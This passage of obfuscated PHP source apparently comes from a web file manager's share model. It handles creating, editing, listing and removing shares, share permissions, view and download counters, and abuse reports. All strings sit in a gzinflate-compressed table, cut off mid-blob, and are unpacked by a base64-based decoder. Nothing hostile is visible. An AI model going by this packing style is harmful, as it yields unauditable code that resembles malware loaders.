$_SERVER[­õöî’–]; $ü¸½½ù³ = array($¼Ÿû…Œ¢[1660] => USER_ID, $¼Ÿû…Œ¢[1174] => $íš¤ÚÉ×); return $this->_getShareInfo($ü¸½½ù³); } private function _getShareInfo($ò†·–¿œ) { $Ã™º à® =& $_SERVER[­õöî’–]; $¯ö±å´í = $this->where($ò†·–¿œ)->find(); if (!$¯ö±å´í) { return !1; } $ò†·–¿œ = array($Ã™º à®[489] => $¯ö±å´í[$Ã™º à®[489]]); $­¸š·ú = $Ã™º à®[1991]; $Øû»ä™² = Model($Ã™º à®[602])->order($Ã™º à®[399])->field($­¸š·ú)->where($ò†·–¿œ)->select(); if ($¯ö±å´í[$Ã™º à®[402]] == $Ã™º à®[197]) { $¯ö±å´í[$Ã™º à®[86]] = IO::info($¯ö±å´í[$Ã™º à®[1174]]); } else { $¯ö±å´í[$Ã™º à®[86]] = Model($Ã™º à®[1334])->pathInfo($¯ö±å´í[$Ã™º à®[402]]); } $¯ö±å´í[$Ã™º à®[1992]] = $Øû»ä™²; return $¯ö±å´í; } protected function getInfoAuth($‹‚é‚ ¤) { $èÊ„ò…Ï =& $_SERVER[­õöî’–]; $˜†ôÅ¼ = $this->getInfo($‹‚é‚ ¤); if ($˜†ôÅ¼[$èÊ„ò…Ï[1660]] == USER_ID) { $˜†ôÅ¼[$èÊ„ò…Ï[413]] = $˜†ôÅ¼[$èÊ„ò…Ï[86]][$èÊ„ò…Ï[413]]; } else { $˜†ôÅ¼[$èÊ„ò…Ï[413]] = Model($èÊ„ò…Ï[502])->authMake($˜†ôÅ¼[$èÊ„ò…Ï[1992]]); } return $˜†ôÅ¼; } protected function listData($Êı€ÓÍÙ = null, $æ¼ªä©İ = 300) { $Ç÷¬Áå =& $_SERVER[­õöî’–]; $š‹ÆÓëˆ = array(array($Ç÷¬Áå[494] => array($Ç÷¬Áå[1010], 0), $Ç÷¬Áå[496] => array($Ç÷¬Áå[1010], 0), $Ç÷¬Áå[1993] => $Ç÷¬Áå[1947])); if ($Êı€ÓÍÙ == $Ç÷¬Áå[1994]) { $š‹ÆÓëˆ = array($Ç÷¬Áå[494] => 1); } else { if ($Êı€ÓÍÙ == $Ç÷¬Áå[1159]) { $š‹ÆÓëˆ = array($Ç÷¬Áå[496] => 1); } } $š‹ÆÓëˆ[$Ç÷¬Áå[1660]] = USER_ID; $®ÌÌ®‚ = $this->where($š‹ÆÓëˆ)->selectPage($æ¼ªä©İ); return $®ÌÌ®‚; } protected function listToMe($ºÅäËÀ = 300) { $èÙóú‘Ë =& $_SERVER[­õöî’–]; $ÖÍŒ’í´ = Model($èÙóú‘Ë[1995])->userGroupParents(USER_ID); $ÆÂ£¢Å£ = array($èÙóú‘Ë[586] => SourceModel::TYPE_USER, $èÙóú‘Ë[505] => USER_ID); if ($ÖÍŒ’í´) { $ÆÂ£¢Å£ = array(array($èÙóú‘Ë[586] => SourceModel::TYPE_USER, $èÙóú‘Ë[505] => USER_ID), array($èÙóú‘Ë[586] => SourceModel::TYPE_GROUP, $èÙóú‘Ë[505] => array($èÙóú‘Ë[7], $ÖÍŒ’í´)), $èÙóú‘Ë[1993] => $èÙóú‘Ë[1947]); } $ğáêÈÕ† = Model($èÙóú‘Ë[602])->where($ÆÂ£¢Å£)->selectPage($ºÅäËÀ); $¡íöÃÁ = array_to_keyvalue_group($ğáêÈÕ†[$èÙóú‘Ë[369]], $èÙóú‘Ë[489]); if (!$¡íöÃÁ) { return $ğáêÈÕ†; } $¨®èÊ£Õ = $èÙóú‘Ë[1996]; $ÆÂ£¢Å£ = array($èÙóú‘Ë[489] => array($èÙóú‘Ë[418], array_keys($¡íöÃÁ)), $èÙóú‘Ë[1660] => array($èÙóú‘Ë[1012], $èÙóú‘Ë[197])); $¸äø‰Ã = $this->field($¨®èÊ£Õ)->where($ÆÂ£¢Å£)->select(); foreach ($¸äø‰Ã as $şã‚¢€ => &$ş¨şõôÛ) { $ş¨şõôÛ[$èÙóú‘Ë[1992]] = $¡íöÃÁ[$ş¨şõôÛ[$èÙóú‘Ë[489]]]; } unset($ş¨şõôÛ); $•ß—Îà¹ = array($èÙóú‘Ë[1997] => $¸äø‰Ã, $èÙóú‘Ë[1998] => $ğáêÈÕ†[$èÙóú‘Ë[366]]); return $•ß—Îà¹; } protected function shareAdd($Øáïîğø, $ŒåĞ“Ä„) { $ŠÍÈÒ¶ =& $_SERVER[­õöî’–]; $­Íëñ× = $this->_addShareData($Øáïîğø, $ŒåĞ“Ä„); if (!empty($ŒåĞ“Ä„[$ŠÍÈÒ¶[1999]])) { $this->_shareAuthSet($­Íëñ×, $ŒåĞ“Ä„[$ŠÍÈÒ¶[1999]]); } $this->shareEventAdd($Øáïîğø, $ŒåĞ“Ä„, $ŠÍÈÒ¶[1162]); return $­Íëñ×; } protected function shareAddSystem($ªÛåÂİ¬, $…’°êâÃ) { $¤¸Õ™ÀÙ =& $_SERVER[­õöî’–]; $Ö¢şÌ®Ï = $this->_addShareData($ªÛåÂİ¬, $…’°êâÃ, $¤¸Õ™ÀÙ[1283]); $this->_shareAuthSet($Ö¢şÌ®Ï, $…’°êâÃ[$¤¸Õ™ÀÙ[1999]]); return $Ö¢şÌ®Ï; } private function shareEventAdd($šäÍ¶¿, $˜´ÚßÄé, $Ğ…„íÉö = "\141\144\144") { $Ë™øĞ¤˜ =& $_SERVER[­õöî’–]; if (!$šäÍ¶¿ || $šäÍ¶¿ == $Ë™øĞ¤˜[197]) { return; } if ($Ğ…„íÉö == $Ë™øĞ¤˜[1162]) { if ($˜´ÚßÄé[$Ë™øĞ¤˜[494]] == $Ë™øĞ¤˜[88]) { Model($Ë™øĞ¤˜[570])->eventShare($šäÍ¶¿, $Ë™øĞ¤˜[2000]); } if ($˜´ÚßÄé[$Ë™øĞ¤˜[496]] == $Ë™øĞ¤˜[88]) { Model($Ë™øĞ¤˜[570])->eventShare($šäÍ¶¿, $Ë™øĞ¤˜[2001]); } return; } $£¿¼²ŠÆ = $this->getInfoByPath($šäÍ¶¿); $Ù”­×ë« = $Ë™øĞ¤˜[2002]; if ($£¿¼²ŠÆ[$Ë™øĞ¤˜[494]] == $Ë™øĞ¤˜[197] && $˜´ÚßÄé[$Ë™øĞ¤˜[494]] == $Ë™øĞ¤˜[88]) { $Ù”­×ë« = $Ë™øĞ¤˜[2000]; } if ($£¿¼²ŠÆ[$Ë™øĞ¤˜[494]] == $Ë™øĞ¤˜[88] && $˜´ÚßÄé[$Ë™øĞ¤˜[494]] == $Ë™øĞ¤˜[197]) { $Ù”­×ë« = $Ë™øĞ¤˜[2003]; } if ($£¿¼²ŠÆ[$Ë™øĞ¤˜[496]] == $Ë™øĞ¤˜[197] && $˜´ÚßÄé[$Ë™øĞ¤˜[496]] == $Ë™øĞ¤˜[88]) { $Ù”­×ë« = $Ë™øĞ¤˜[2001]; } if ($£¿¼²ŠÆ[$Ë™øĞ¤˜[496]] == $Ë™øĞ¤˜[88] && $˜´ÚßÄé[$Ë™øĞ¤˜[496]] == $Ë™øĞ¤˜[197]) { $Ù”­×ë« = $Ë™øĞ¤˜[2004]; } Model($Ë™øĞ¤˜[570])->eventShare($šäÍ¶¿, $Ù”­×ë«); return; } private function _addShareData($õî€™Àˆ, $’Û¿²¶ª = array(), $öÙãã¹Ã = false) { $ç°öÈ–‚ =& $_SERVER[­õöî’–]; $ ØØ“•Ş = $öÙãã¹Ã == $ç°öÈ–‚[1283] ? 0 : USER_ID; $‹ó‹¥¼ = array($ç°öÈ–‚[417] => $õî€™Àˆ, $ç°öÈ–‚[1651] => $ ØØ“•Ş); if ($õî€™Àˆ == 0) { $‹ó‹¥¼ = array($ç°öÈ–‚[2005] => $’Û¿²¶ª[$ç°öÈ–‚[1174]], $ç°öÈ–‚[1651] => $ ØØ“•Ş); } if ($ßï²—ƒ¹ = $this->where($‹ó‹¥¼)->find()) { return $ßï²—ƒ¹[$ç°öÈ–‚[489]]; } if ($õî€™Àˆ == 0) { $Ï•©ß¹ˆ = array($ç°öÈ–‚[32] => get_path_this($’Û¿²¶ª[$ç°öÈ–‚[84]])); } else { $Ï•©ß¹ˆ = Model($ç°öÈ–‚[816])->sourceInfo($õî€™Àˆ); if (!$Ï•©ß¹ˆ) { return !1; } } if (!$’Û¿²¶ª[$ç°öÈ–‚[1560]]) { $’Û¿²¶ª[$ç°öÈ–‚[1560]] = $Ï•©ß¹ˆ[$ç°öÈ–‚[32]]; } $ä¢ˆ÷á­ = array($ç°öÈ–‚[1651] => $ ØØ“•Ş, $ç°öÈ–‚[417] => $õî€™Àˆ, $ç°öÈ–‚[1560] => $ç°öÈ–‚[12], $ç°öÈ–‚[494] => 0, $ç°öÈ–‚[496] => 0, $ç°öÈ–‚[1174] => $ç°öÈ–‚[12], $ç°öÈ–‚[307] => $ç°öÈ–‚[12], $ç°öÈ–‚[886] => $ç°öÈ–‚[12], $ç°öÈ–‚[2006] => 0, $ç°öÈ–‚[2007] => 0, $ç°öÈ–‚[497] => 0, $ç°öÈ–‚[498] => $ç°öÈ–‚[12], $ç°öÈ–‚[491] => $ç°öÈ–‚[12]); $Ï§Şƒ = explode($ç°öÈ–‚[50], $ç°öÈ–‚[2008]); foreach ($Ï§Şƒ as $ş˜şêòù) { if (!isset($’Û¿²¶ª[$ş˜şêòù])) { continue; } $ä¢ˆ÷á­[$ş˜şêòù] = $’Û¿²¶ª[$ş˜şêòù]; } $õ¢Îƒó = $this->add($ä¢ˆ÷á­); $¯œëÑ§Û = array($ç°öÈ–‚[491] => short_id($õ¢Îƒó)); $this->where(array($ç°öÈ–‚[488] => $õ¢Îƒó))->save($¯œëÑ§Û); return $õ¢Îƒó; } private function _shareAuthSet($ªªĞğŒ§, $ßâÎ°©Æ) { $•ô€çé’ =& $_SERVER[­õöî’–]; if (!is_array($ßâÎ°©Æ)) { return !1; } $±ŸÍÛÑù = Model($•ô€çé’[1957]); $±ŸÍÛÑù->where(array($•ô€çé’[489] => $ªªĞğŒ§))->delete(); $Ğ¼ìŸã„ = array(); foreach ($ßâÎ°©Æ as $ıô™·…) { $¢Ğã½ÂÏ = SourceModel::TYPE_USER; if ($ıô™·…[$•ô€çé’[411]] == SourceModel::TYPE_GROUP) { $¢Ğã½ÂÏ = SourceModel::TYPE_GROUP; } $ÆÄ½ªŠç = array($•ô€çé’[489] => $ªªĞğŒ§, $•ô€çé’[411] => $¢Ğã½ÂÏ, $•ô€çé’[505] => intval($ıô™·…[$•ô€çé’[505]]), $•ô€çé’[1953] => 0, $•ô€çé’[2009] => -1); if ($ıô™·…[$•ô€çé’[1953]]) { $ÆÄ½ªŠç[$•ô€çé’[1953]] = $ıô™·…[$•ô€çé’[1953]]; } else { if ($ıô™·…[$•ô€çé’[2009]]) { $ÆÄ½ªŠç[$•ô€çé’[2009]] = $ıô™·…[$•ô€çé’[2009]]; } } $Ğ¼ìŸã„[] = $ÆÄ½ªŠç; } return $±ŸÍÛÑù->addAll($Ğ¼ìŸã„, array(), !0); } public function numViewAdd($İ–›ĞÈŞ) { $å…˜¬Ê =& $_SERVER[­õöî’–]; $Ş×¥Èßª = array($å…˜¬Ê[488] => $İ–›ĞÈŞ); $this->where($Ş×¥Èßª)->setAdd($å…˜¬Ê[2006]); } public function numDownloadAdd($ù¢öÅ¨ó) { $ÉÚÒé‹ò =& $_SERVER[­õöî’–]; $œÂğãõŒ = array($ÉÚÒé‹ò[488] => $ù¢öÅ¨ó); $this->where($œÂğãõŒ)->setAdd($ÉÚÒé‹ò[2007]); } protected function shareEdit($ÏÄºìÀì, $½¬¯¡È) { $±Á‘˜ı¸ =& $_SERVER[­õöî’–]; $¿æÕÂ«„ = $this->getInfo($ÏÄºìÀì); if (!$¿æÕÂ«„) { return !1; } $this->_checkLinkShare($½¬¯¡È, $¿æÕÂ«„); $”Ú’Ÿê = array(); $§åµ–ÛÁ = explode($±Á‘˜ı¸[50], $±Á‘˜ı¸[2010]); foreach ($§åµ–ÛÁ as $±­İ¥¼±) { if (!array_key_exists($±­İ¥¼±, $½¬¯¡È)) { continue; } $”Ú’Ÿê[$±­İ¥¼±] = $½¬¯¡È[$±­İ¥¼±]; } $this->shareEventAdd($¿æÕÂ«„[$±Á‘˜ı¸[402]], $½¬¯¡È, $±Á‘˜ı¸[1819]); $this->where(array($±Á‘˜ı¸[488] => $ÏÄºìÀì))->save($”Ú’Ÿê); if (isset($½¬¯¡È[$±Á‘˜ı¸[1999]])) { $this->_shareAuthSet($ÏÄºìÀì, $½¬¯¡È[$±Á‘˜ı¸[1999]]); } return !0; } private function _checkLinkShare($î“â•ı”, $¡‡çíş) { $øë§ç =& $_SERVER[­õöî’–]; if ($î“â•ı”[$øë§ç[494]] != $øë§ç[88]) { return; } $œ¡ƒÉùÌ = $¡‡çíş[$øë§ç[86]][$øë§ç[402]]; if ($¡‡çíş[$øë§ç[86]][$øë§ç[33]] != $øë§ç[199]) { $çÖàùŠŠ = $this->_folderReport($œ¡ƒÉùÌ); if (!$çÖàùŠŠ) { return; } show_json(LNG($øë§ç[2011]) . $øë§ç[2012] . $çÖàùŠŠ, !1); } $ë¥¢ï„ = Model($øë§ç[816])->fileInfoGet($¡‡çíş[$øë§ç[86]][$øë§ç[402]]); if (!$ë¥¢ï„) { return; } $ƒé…şÑ = $this->shareFileMeta($ë¥¢ï„[$øë§ç[468]]); if (isset($ƒé…şÑ[$øë§ç[374]]) && $ƒé…şÑ[$øë§ç[374]] == $øë§ç[88]) { show_json(LNG($øë§ç[2013]), !1); } } private function _folderReport($«ª‰Ëèù) { $èš¹™”² =& $_SERVER[­õöî’–]; $‘€—¾Á = array($èš¹™”²[468] => array($èš¹™”²[1010], 0), $èš¹™”²[741] => 3); $øˆÊîàÄ = Model($èš¹™”²[2014])->where($‘€—¾Á)->field($èš¹™”²[468])->select(); if (!$øˆÊîàÄ) { return !1; } $øˆÊîàÄ = array_to_keyvalue($øˆÊîàÄ, $èš¹™”²[12], $èš¹™”²[468]); $Ç®’ÄãÛ = $èš¹™”²[50] . $«ª‰Ëèù . $èš¹™”²[50]; $‘€—¾Á = array($èš¹™”²[468] => array($èš¹™”²[7], $øˆÊîàÄ), $èš¹™”²[521] => array($èš¹™”²[383], "\45{$Ç®’ÄãÛ}\x25"), $èš¹™”²[431] => 0); $²Ã‰ãğä = Model($èš¹™”²[816])->where($‘€—¾Á)->field($èš¹™”²[2015])->find(); if (!$²Ã‰ãğä) { return !1; } $×ĞÊ±¼— = substr($²Ã‰ãğä[$èš¹™”²[521]], strpos($²Ã‰ãğä[$èš¹™”²[521]], $Ç®’ÄãÛ)); $‘€—¾Á = array($èš¹™”²[402] => array($èš¹™”²[7], trim($×ĞÊ±¼—, $èš¹™”²[50]))); $²å™ç‘ = Model($èš¹™”²[816])->where($‘€—¾Á)->field($èš¹™”²[32])->select(); $¦Ò»ºĞ = array_to_keyvalue($²å™ç‘, $èš¹™”²[12], $èš¹™”²[32]); $¦Ò»ºĞ[] = $²Ã‰ãğä[$èš¹™”²[32]]; return implode($èš¹™”²[8], $¦Ò»ºĞ); } protected function remove($ğ•âÉÍ) { $ÁëÍ¤•Á =& $_SERVER[­õöî’–]; if (is_array($ğ•âÉÍ)) { $ğ•âÉÍ = array($ÁëÍ¤•Á[7], $ğ•âÉÍ); } $’¦é©¡¤ = array($ÁëÍ¤•Á[489] => $ğ•âÉÍ); $¶£¬¬œ´ = $this->where($’¦é©¡¤)->delete(); if ($¶£¬¬œ´) { Model($ÁëÍ¤•Á[602])->where(array($ÁëÍ¤•Á[489] => $ğ•âÉÍ))->delete(); } $§Ö†éñª = is_array($ğ•âÉÍ) ? $ğ•âÉÍ[1] : array($ğ•âÉÍ); for ($ìí«´Œà = 0; $ìí«´Œà < count($§Ö†éñª); $ìí«´Œà++) { $úÀ¡ ­ = $this->getInfo($§Ö†éñª[$ìí«´Œà]); if ($úÀ¡ ­[$ÁëÍ¤•Á[496]] == $ÁëÍ¤•Á[88]) { Model($ÁëÍ¤•Á[570])->eventShare($úÀ¡ ­[$ÁëÍ¤•Á[402]], $ÁëÍ¤•Á[2004]); } if ($úÀ¡ ­[$ÁëÍ¤•Á[494]] == $ÁëÍ¤•Á[88]) { Model($ÁëÍ¤•Á[570])->eventShare($úÀ¡ ­[$ÁëÍ¤•Á[402]], $ÁëÍ¤•Á[2003]); } } return $¶£¬¬œ´; } protected function removeBySource($öÍµ¨ÓÚ) { $‹Éİ¢¡Ë =& $_SERVER[­õöî’–]; $Ïü¿Í¶Ş = array($‹Éİ¢¡Ë[417] => array($‹Éİ¢¡Ë[418], $öÍµ¨ÓÚ)); $÷¤çöÛ¡ = $this->field($‹Éİ¢¡Ë[489])->where($Ïü¿Í¶Ş)->select(); $÷¤çöÛ¡ = array_to_keyvalue($÷¤çöÛ¡, $‹Éİ¢¡Ë[12], $‹Éİ¢¡Ë[489]); if (!$÷¤çöÛ¡) { return; } $Ïü¿Í¶Ş = array($‹Éİ¢¡Ë[488] => array($‹Éİ¢¡Ë[418], $÷¤çöÛ¡)); $this->where($Ïü¿Í¶Ş)->delete(); Model($‹Éİ¢¡Ë[602])->where($Ïü¿Í¶Ş)->delete(); } public function listAll($ûÔ‡ËªÖ) { $ø”ÑåÓ’ =& $_SERVER[­õöî’–]; $—úä„ô = array(); if ($ûÔ‡ËªÖ[$ø”ÑåÓ’[1660]]) { $—úä„ô[$ø”ÑåÓ’[1660]] = $ûÔ‡ËªÖ[$ø”ÑåÓ’[1660]]; } if ($ûÔ‡ËªÖ[$ø”ÑåÓ’[752]]) { $Ì«äŒõª = $ûÔ‡ËªÖ[$ø”ÑåÓ’[497]] ? $ûÔ‡ËªÖ[$ø”ÑåÓ’[497]] : strtotime(date($ø”ÑåÓ’[2016])); $—úä„ô[$ø”ÑåÓ’[200]] = array($ø”ÑåÓ’[333], array($ûÔ‡ËªÖ[$ø”ÑåÓ’[752]], $Ì«äŒõª)); } if ($ûÔ‡ËªÖ[$ø”ÑåÓ’[33]]) { $—úä„ô[$ûÔ‡ËªÖ[$ø”ÑåÓ’[33]]] = 1; } else { $—úä„ô[] = array($ø”ÑåÓ’[494] => array($ø”ÑåÓ’[1010], 0), $ø”ÑåÓ’[496] => array($ø”ÑåÓ’[1010], 0), $ø”ÑåÓ’[1993] => $ø”ÑåÓ’[1947]); } if ($ûÔ‡ËªÖ[$ø”ÑåÓ’[1943]]) { $—úä„ô[] = array($ø”ÑåÓ’[491] => $ûÔ‡ËªÖ[$ø”ÑåÓ’[1943]], $ø”ÑåÓ’[1560] => array($ø”ÑåÓ’[383], "\x25{$ûÔ‡ËªÖ[$ø”ÑåÓ’[1943]]}\x25"), $ø”ÑåÓ’[1993] => $ø”ÑåÓ’[1947]); } $¡˜¯•¨Á = $this->_makeOrder()->where($—úä„ô)->selectPage(20); if (empty($¡˜¯•¨Á[$ø”ÑåÓ’[369]])) { return array(); } $this->_listDataApply($¡˜¯•¨Á[$ø”ÑåÓ’[369]]); return $¡˜¯•¨Á; } public function listDataApply($ğõß•ï£) { $this->_listDataApply($ğõß•ï£); return $ğõß•ï£; } private function _listDataApply(&$êâğé) { $ÖıÇ‘› =& $_SERVER[­õöî’–]; $²ÏÂ«ŞÖ = array_to_keyvalue($êâğé, $ÖıÇ‘›[12], $ÖıÇ‘›[1660]); $ë¦ü¯éÎ = Model($ÖıÇ‘›[535])->userListInfo(array_unique($²ÏÂ«ŞÖ)); $ † Ç = array_to_keyvalue($êâğé, $ÖıÇ‘›[12], $ÖıÇ‘›[402]); $ÔÎò¯şˆ = Model($ÖıÇ‘›[816])->sourceListInfo($ † Ç, !0); foreach ($êâğé as $¼­½™¤¥ => &$áÔİËŒˆ) { $ŒÆ¦Äç€ = $áÔİËŒˆ[$ÖıÇ‘›[1660]]; $áÔİËŒˆ[$ÖıÇ‘›[2017]] = $ë¦ü¯éÎ[$ŒÆ¦Äç€] ? $ë¦ü¯éÎ[$ŒÆ¦Äç€] : !1; $¤†âÚå‡ = $áÔİËŒˆ[$ÖıÇ‘›[402]]; $áÔİËŒˆ[$ÖıÇ‘›[86]] = $ÔÎò¯şˆ[$¤†âÚå‡] ? $ÔÎò¯şˆ[$¤†âÚå‡] : !1; if ($áÔİËŒˆ[$ÖıÇ‘›[86]][$ÖıÇ‘›[431]] == $ÖıÇ‘›[88]) { unset($êâğé[$¼­½™¤¥]); } if ($áÔİËŒˆ[$ÖıÇ‘›[86]] != $ÖıÇ‘›[197] && !$áÔİËŒˆ[$ÖıÇ‘›[86]]) { unset($êâğé[$¼­½™¤¥]); } } unset($áÔİËŒˆ); $êâğé = array_values($êâğé); } private function _makeOrder($Üê‰ñÓ– = '') { $•è¤Ãù  =& $_SERVER[­õöî’–]; $ü¥úÔŠÔ = array($•è¤Ãù [200], $•è¤Ãù [497], $•è¤Ãù [2006], $•è¤Ãù [2007]); $ìƒÅŸ¥« = array($•è¤Ãù [450] => $•è¤Ãù [451], $•è¤Ãù [452] => $•è¤Ãù [453]); $æçß’Õ€ = Input::get($•è¤Ãù [457], $•è¤Ãù [7], $•è¤Ãù [423], $ü¥úÔŠÔ); $ßÓ‚êô¡ = Input::get($•è¤Ãù [458], $•è¤Ãù [7], $•è¤Ãù [2018], array($•è¤Ãù [1940], $•è¤Ãù [452])); $ßÓ‚êô¡ = $ìƒÅŸ¥«[$ßÓ‚êô¡]; $Üê‰ñÓ– = $Üê‰ñÓ– . "{$æçß’Õ€}\x20{$ßÓ‚êô¡}"; return $this->order($Üê‰ñÓ–); } public function reportAdd($ÃŠÀÈëÉ) { $Şªñ…ü =& $_SERVER[­õöî’–]; $ï„†öôá = array($Şªñ…ü[489] => $ÃŠÀÈëÉ[$Şªñ…ü[489]], $Şªñ…ü[1660] => USER_ID); if (Model($Şªñ…ü[2014])->where($ï„†öôá)->find()) { return !1; } $†¢Êà¼á = array($Şªñ…ü[489] => $ÃŠÀÈëÉ[$Şªñ…ü[489]], $Şªñ…ü[1560] => $ÃŠÀÈëÉ[$Şªñ…ü[1560]], $Şªñ…ü[402] => $ÃŠÀÈëÉ[$Şªñ…ü[402]], $Şªñ…ü[468] => $ÃŠÀÈëÉ[$Şªñ…ü[468]], $Şªñ…ü[1660] => USER_ID, $Şªñ…ü[33] => $ÃŠÀÈëÉ[$Şªñ…ü[33]], $Şªñ…ü[453] => $ÃŠÀÈëÉ[$Şªñ…ü[453]]); return Model($Şªñ…ü[2014])->add($†¢Êà¼á); } public function reportList($”Âı½Æ) { $ãÑÂôï =& $_SERVER[­õöî’–]; $ÜÏ÷®Ù = array(); if ($”Âı½Æ[$ãÑÂôï[752]]) { $õØ„Ëè’ = $”Âı½Æ[$ãÑÂôï[497]] ? $”Âı½Æ[$ãÑÂôï[497]] : strtotime(date($ãÑÂôï[2016])); $ÜÏ÷®Ù[$ãÑÂôï[200]] = array($ãÑÂôï[333], array($”Âı½Æ[$ãÑÂôï[752]], $õØ„Ëè’)); } if (isset($”Âı½Æ[$ãÑÂôï[33]]) && in_array($”Âı½Æ[$ãÑÂôï[33]], array($ãÑÂôï[88], $ãÑÂôï[437], $ãÑÂôï[2019], $ãÑÂôï[2020], $ãÑÂôï[2021]))) { $ÜÏ÷®Ù[$ãÑÂôï[33]] = $”Âı½Æ[$ãÑÂôï[33]]; } if (isset($”Âı½Æ[$ãÑÂôï[741]]) && in_array($”Âı½Æ[$ãÑÂôï[741]], array($ãÑÂôï[197], $ãÑÂôï[88], $ãÑÂôï[437], $ãÑÂôï[2019]))) { $ÜÏ÷®Ù[$ãÑÂôï[741]] = $”Âı½Æ[$ãÑÂôï[741]]; } $ƒÃæß = Input::get($ãÑÂôï[458], $ãÑÂôï[7], $ãÑÂôï[2018], array($ãÑÂôï[1940], $ãÑÂôï[452])); $ÂÁŒÚ•— = array($ãÑÂôï[450] => $ãÑÂôï[451], $ãÑÂôï[452] => $ãÑÂôï[453]); $Šñî§Íò = $ãÑÂôï[2022] . $ÂÁŒÚ•—[$ƒÃæß]; $Ñ©Ä¹§µ = Model($ãÑÂôï[2014])->where($ÜÏ÷®Ù)->order($Šñî§Íò)->selectPage(20); if (empty($Ñ©Ä¹§µ[$ãÑÂôï[369]])) { return array(); } $²–Õ¨ù± = array_to_keyvalue_group($Ñ©Ä¹§µ[$ãÑÂôï[369]], $ãÑÂôï[741], $ãÑÂôï[489]); if (!empty($²–Õ¨ù±[0])) { $”Âı½Æ = $²–Õ¨ù±[0]; $ÜÏ÷®Ù = array($ãÑÂôï[489] => array($ãÑÂôï[7], $”Âı½Æ)); $Äš„ŸÚ = $this->where($ÜÏ÷®Ù)->field($ãÑÂôï[489])->select(); $Äš„ŸÚ = array_to_keyvalue($Äš„ŸÚ, $ãÑÂôï[12], $ãÑÂôï[489]); $ûÀûºô = array_diff($”Âı½Æ, $Äš„ŸÚ); if (!empty($ûÀûºô)) { foreach ($Ñ©Ä¹§µ[$ãÑÂôï[369]] as $Äš‰×ßß => $üªîÌ±·) { if (in_array($üªîÌ±·[$ãÑÂôï[489]], $ûÀûºô)) { unset($Ñ©Ä¹§µ[$ãÑÂôï[369]][$Äš‰×ßß]); } } } } $this->_listDataApply($Ñ©Ä¹§µ[$ãÑÂôï[369]]); return $Ñ©Ä¹§µ; } public function reportStatus($ä®šÎèò) { $™·Üíñ¤ =& $_SERVER[­õöî’–]; $Úƒ†—Äå = array($™·Üíñ¤[399] => $ä®šÎèò[$™·Üíñ¤[399]]); $Ì±Ê»µ· = Model($™·Üíñ¤[2014])->where($Úƒ†—Äå)->field($™·Üíñ¤[2023])->find(); if (!$Ì±Ê»µ·) { return !1; } $Õ¹ï¤ú = array($™·Üíñ¤[741] => $ä®šÎèò[$™·Üíñ¤[741]]); if ($ä®šÎèò[$™·Üíñ¤[741]] == $™·Üíñ¤[2019] && $Ì±Ê»µ·[$™·Üíñ¤[741]] == $™·Üíñ¤[2019]) { $Õ¹ï¤ú[$™·Üíñ¤[741]] = 0; } $ö‘ßµ«Ã = Model($™·Üíñ¤[2014])->where($Úƒ†—Äå)->save($Õ¹ï¤ú); if ($ä®šÎèò[$™·Üíñ¤[741]] == $™·Üíñ¤[437]) { if ($Ì±Ê»µ·[$™·Üíñ¤[468]] != $™·Üíñ¤[197] && $this->shareFileMeta($Ì±Ê»µ·[$™·Üíñ¤[468]])) { $this->shareFileMeta($Ì±Ê»µ·[$™·Üíñ¤[468]], 0); } $this->remove($Ì±Ê»µ·[$™·Üíñ¤[489]]); return !0; } if ($ö‘ßµ«Ã && $ä®šÎèò[$™·Üíñ¤[741]] == $™·Üíñ¤[2019]) { $‹²…Ì­å = $Õ¹ï¤ú[$™·Üíñ¤[741]] == $™·Üíñ¤[2019] ? 1 : 0; $this->shareFileMeta($Ì±Ê»µ·[$™·Üíñ¤[468]], $‹²…Ì­å); $this->removeByFile($Ì±Ê»µ·[$™·Üíñ¤[468]]); } return $ö‘ßµ«Ã; } private function removeByFile($ËÃî“¡) { $ıœ¸‹ìÓ =& $_SERVER[­õöî’–]; $ëı÷±‡ú = Model($ıœ¸‹ìÓ[816])->where(array($ıœ¸‹ìÓ[468] => $ËÃî“¡))->field($ıœ¸‹ìÓ[402])->select(); $Á¿®¡›õ = array_to_keyvalue($ëı÷±‡ú, $ıœ¸‹ìÓ[12], $ıœ¸‹ìÓ[402]); $ŸÃ¹¬« = array($ıœ¸‹ìÓ[402] => array($ıœ¸‹ìÓ[7], $Á¿®¡›õ), $ıœ¸‹ìÓ[494] => 1); $ëı÷±‡ú = $this->where($ŸÃ¹¬«)->field($ıœ¸‹ìÓ[489])->select(); if (empty($ëı÷±‡ú)) { return; } $¾í†Ûñı = array_to_keyvalue($ëı÷±‡ú, $ıœ¸‹ìÓ[12], $ıœ¸‹ìÓ[489]); $this->remove($¾í†Ûñı); } private function shareFileMeta($ÅÄ­“Úé, $ı‡ß°€Ç = null) { $ı˜üİß¨ =& $_SERVER[­õöî’–]; $‹¼¾øÀ¡ = array($ı˜üİß¨[468] => $ÅÄ­“Úé, $ı˜üİß¨[94] => $ı˜üİß¨[2024]); if (is_null($ı‡ß°€Ç)) { return Model($ı˜üİß¨[2025])->where($‹¼¾øÀ¡)->find(); } $‹¼¾øÀ¡[$ı˜üİß¨[374]] = $ı‡ß°€Ç; Model($ı˜üİß¨[2025])->add($‹¼¾øÀ¡, array(), !0); } } goto båæÁ³ÒïÆ; EœÓŞŸÎ¯Ê: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xad\xf5\xf6\xee\x92\x96", "\212\273\317\222\373\303"); $_SERVER[­õöî’–] = explode("\x7c\x3\x7c\x5\x7c\x6", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\7\170\34\325\325\60\14\241\232\362\2\201\4\22\2\14\302\106\305\133\344\156\313\226\345\225\264\262\326\136\151\345\335\225\13\222"."\x18\x8f\x76\x47\xbb\x23\xed\xee\xac\x67\x66\x55\x5c\x68\xa1\x63\x9b\xd0\x21\x10\x7a\x4d\xc0\xb4\xd0\x62\xc\xa6\x3a\x9\x21\x21\x10\x8\x84\xc0\x1b\x8a\x8d\xfd\x42\xe2\x84\x92\x4\x8\xf0\xdd"."\x72\x6e\x99\xd9\x15\xbc\xff\xf3\x7f\xcf\xf3\x19\xec\xbd\xf7\xdc\x32\xb7\x9e\x7b\xce\xb9\xe7\x9c\xfb\x97\xdd\xef\xbd\xf3\xc2\x8b\x6b\xf7\x5a\xbb\xcf\xda\x7d\x37\xfe\xfd\xa9\x4d\xff\xb8\x98\x8